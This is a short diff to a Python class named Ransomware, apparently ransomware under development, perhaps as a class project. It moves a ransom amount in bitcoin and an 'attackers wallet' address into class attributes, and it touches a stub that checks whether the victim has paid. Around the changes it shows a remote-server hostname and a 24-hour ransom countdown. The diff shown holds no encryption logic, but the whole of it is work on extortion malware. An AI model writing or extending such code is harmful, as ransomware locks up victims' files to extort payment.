@@ -17,6 +17,10 @@ class Ransomware:
     ENCODING = "utf-8"
     MAX_SIZE = 4096
 
+    bitcoin_needed = 0.001 #TODO: Assign this based on number of files
+    wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
+
+
     def __init__(self, host1, host2, number, directory):
         # Construct hostname of the remote server from the first two
         # arguments.
@@ -94,6 +98,7 @@ class Ransomware:
 
     #TODO Subin:
     def check_if_user_has_paid(self):
+        
         return False
 
 
@@ -240,8 +245,7 @@ class Ransomware:
         start_time = time.time()
         remaining_time = 86400
 
-        bitcoin_needed = 0.001 #TODO: Assign this based on number of files
-        wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
+
 
         while remaining_time > 0:
             # Format the remaining time as hours, minutes and seconds
